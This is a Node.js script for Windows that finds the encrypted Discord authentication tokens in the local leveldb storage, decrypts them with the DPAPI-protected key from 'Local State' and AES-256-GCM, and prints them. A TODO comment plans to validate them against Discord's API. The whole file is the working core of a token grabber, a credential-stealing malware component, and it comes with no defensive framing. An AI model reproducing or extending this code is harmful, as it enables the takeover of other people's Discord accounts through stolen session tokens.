const fs = require('fs')
const crypto = require('crypto')
const path = require('path')
const dpapi = require('win-dpapi')

if (process.platform !== 'win32') throw new Error('This only works on Windows')

const appDataPath = process.env.APPDATA
const discordPath = path.join(appDataPath, 'discord')
const discordDbPath = path.join(discordPath, 'Local Storage', 'leveldb')
const discordLocalStatePath = path.join(discordPath, 'Local State')

async function extractTokensFromDiscordDb() {
  const files = await fs.promises.readdir(discordDbPath)
  const tokens = new Set()
  await Promise.all(
    files
      .filter(f => f.endsWith('.ldb'))
      .map(async file => {
        const content = await fs.promises.readFile(path.join(discordDbPath, file), 'utf8')
        const tokensInFile = [...content.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)].filter(x => x.length >= 2).map(x => x[1])
        tokensInFile.forEach(token => tokens.add(token))
      })
  )
  return [...tokens]
}

async function getDecryptionKey() {
  const localState = JSON.parse(await fs.promises.readFile(discordLocalStatePath, 'utf8')).os_crypt.encrypted_key
  const encryptedKey = Buffer.from(localState, 'base64').slice(5)
  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser')
  return key
}

async function decryptToken(token, decryptionKey) {
  token = token.split('dQw4w9WgXcQ:')[1]
  token = Buffer.from(token, 'base64')
  const nonce = token.slice(3, 15)
  const encryptedValue = token.slice(15, token.length - 16)
  const tag = token.slice(token.length - 16, token.length)
  const decipher = crypto.createDecipheriv('aes-256-gcm', decryptionKey, nonce)
  decipher.setAuthTag(tag)
  token = decipher.update(encryptedValue, 'base64', 'utf-8')
  token += decipher.final('utf-8')
  return token
}

const setup = async () => {
  const extractedTokens = await extractTokensFromDiscordDb()
  const decryptionKey = await getDecryptionKey()

  const tokens = new Set()
  for (const extractedToken of extractedTokens) {
    // TODO: Support unencrypted tokens
    const isEncrypted = true
    if (isEncrypted) {
      const decrypted = await decryptToken(extractedToken, decryptionKey)
      tokens.add(decrypted)
    }
  }
  // TODO: call https://discord.com/api/v9/users/@me
  console.log(tokens)
}

setup()
